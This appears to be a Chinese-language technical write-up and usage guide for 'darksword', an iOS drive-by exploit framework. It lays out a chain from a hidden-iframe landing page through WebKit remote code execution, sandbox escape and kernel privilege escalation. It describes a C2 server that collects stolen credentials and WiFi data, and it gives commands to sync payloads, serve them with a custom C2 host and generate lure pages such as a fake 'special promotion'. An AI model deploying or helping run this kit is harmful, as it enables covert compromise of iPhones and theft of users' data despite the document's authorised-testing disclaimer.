## 三、漏洞利用链流程

```
index.html → frame.html → rce_loader.js → rce_module*.js → rce_worker*.js → sbx*.js → pe_main.js
```

### 各阶段详细说明

| 阶段 | 文件 | 功能 |
|------|------|------|
| **1** | index.html | 着陆页，检测移动端后加载隐藏 iframe |
| **2** | frame.html | 注入 rce_loader.js |
| **3** | rce_loader.js | 根据 iOS 版本加载对应 RCE 模块 |
| **4** | rce_module*.js | JavaScriptCore RCE 漏洞（CVE-2025-31277/43529） |
| **5** | rce_worker*.js | WebWorker 中的漏洞利用 |
| **6** | sbx0_main_18.4.js | 沙箱逃逸阶段0（GPU 进程通信） |
| **7** | sbx1_main.js | 沙箱逃逸阶段1（内存操作） |
| **8** | pe_main.js | 权限提升（获取 root） |

## 四、核心模块分析

### 4.1 CLI 模块 (cli.py)

提供以下命令：

| 命令 | 描述 | 选项 |
|------|------|------|
| `darksword serve` | 启动 HTTP 服务器分发漏洞 | `-H`(host), `-p`(port), `--redirect`, `--c2-host` |
| `darksword sync` | 从 GitHub 同步 RCE payloads | `-f`(force) |
| `darksword sync-kexploit` | 同步内核漏洞代码 | `-f`(force) |
| `darksword list` | 列出本地 payloads | 无 |
| `darksword info` | 显示漏洞链信息 | 无 |
| `darksword template generate` | 生成自定义着陆页 | `--title`, `--redirect` |
| `darksword template list` | 列出模板 | 无 |

**关键功能**：
- 支持自定义 C2 主机（`--c2-host`）
- 自动检测 payload 目录是否为空
- 端口冲突检测

### 4.2 服务器模块 (server.py)

**核心特性**：
- **动态注入 C2 地址**：在 `pe_main.js` 中替换 `__DS_C2_HOST__` 和 `__DS_C2_PORT__`
- **数据窃取**：接收 `/upload` POST 请求，保存窃取的数据到 `exfil/` 目录
- **文件服务**：优先从 `payloads/` 提供文件，回退到 `templates/`
- **CORS 支持**：允许跨域访问
- **日志记录**：记录所有请求（排除 favicon）

**数据窃取格式**：
```json
{
  "deviceUUID": "设备标识",
  "category": "数据类别（credential/wifi等）",
  "path": "文件路径",
  "description": "描述",
  "data": "base64 编码的数据"
}
```

### 4.3 Payload 管理模块 (payloads.py)

**同步源**：
- **DarkSword-RCE**：`htimesnine/DarkSword-RCE` 和 `ghh-jb/DarkSword`（fallback）
- **darksword-kexploit**：`opa334/darksword-kexploit`

**同步机制**：
- 默认跳过已存在文件（除非使用 `-f` 强制覆盖）
- `rce_worker.js` 自动复制为 `rce_worker_18.4.js`

### 4.4 配置模块 (config.py)

定义 `ServeConfig` 数据类：
- `host` - 绑定地址（默认 `0.0.0.0`）
- `port` - 端口（默认 `8080`）
- `redirect_url` - 重定向 URL
- `custom_host_in_loader` - 自定义 C2 地址

## 五、漏洞利用技术细节

### 5.1 RCE 阶段

- **iOS 18.4**：利用 CVE-2025-31277
- **iOS 18.6**：利用 CVE-2025-43529

`rce_loader.js` 中的版本检测逻辑：
```javascript
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
    workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`);
else
    workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`);
```

### 5.2 沙箱逃逸

`sbx0_main_18.4.js` 和 `sbx1_main.js` 包含：
- **设备特定偏移量**：针对 iPhone11 到 iPhone17 系列的偏移表
- **GPU 进程通信**：利用 WebKit GPU 进程漏洞
- **ROP Gadgets**：大量预计算的 gadget 地址

### 5.3 提权阶段

`pe_main.js` 包含完整的提权逻辑：
- **libsystem 函数调用**：`calloc`, `malloc`, `memcpy`, `mach_vm_allocate` 等
- **Objective-C 运行时**：`objc_msgSend`, `objc_getClass`
- **内核操作**：`mach_make_memory_entry_64`, `mach_vm_map`
- **文件操作**：读取敏感数据、窃取凭证和 WiFi 信息

## 六、安全注意事项

**⚠️ 重要提醒**：此框架仅用于授权的安全测试和红队演练。未经授权使用可能违反法律法规。

**现有问题**：
1. **硬编码地址**：`rce_loader.js` 中硬编码了 `https://static.cdncounter.net/assets`，服务器模块会动态替换，但原始文件存在外部依赖
2. **日志功能被注释**：日志上报功能已被注释，可能影响调试
3. **iOS 18.7 支持**：`rce_worker_18.7.js` 未公开，无法攻击 iOS 18.7
4. **HTTP 传输**：默认使用 HTTP，数据传输可能被拦截

## 七、启动与使用方法

### 7.1 安装依赖

```bash
cd d:\wwwroot\darksword
pip install -e .
```

### 7.2 同步 Payloads

```bash
darksword sync
darksword sync-kexploit
```

### 7.3 启动服务器

```bash
# 默认启动（端口 8080）
darksword serve

# 指定地址和端口
darksword serve -H 0.0.0.0 -p 8080

# 自定义 C2 主机
darksword serve -p 8080 --c2-host https://your-c2-server.com
```

### 7.4 访问方式

iOS 设备通过 Safari 访问：`http://<服务器IP>:8080/`

### 7.5 生成自定义着陆页

```bash
darksword template generate --title "Promoção Especial" --redirect https://site-legitimo.com
```

## 九、总结

这是一个结构完整的 iOS 漏洞利用框架，包含：
- **完整的漏洞链**：从 WebKit RCE 到内核提权
- **版本适配**：支持 iOS 18.4-18.6 多个版本
- **灵活的 CLI**：支持自定义配置和模板生成
- **数据窃取能力**：自动收集设备数据并保存到本地

代码质量良好，结构清晰，但存在一些安全风险（如硬编码外部地址）。建议仅在授权环境中使用。
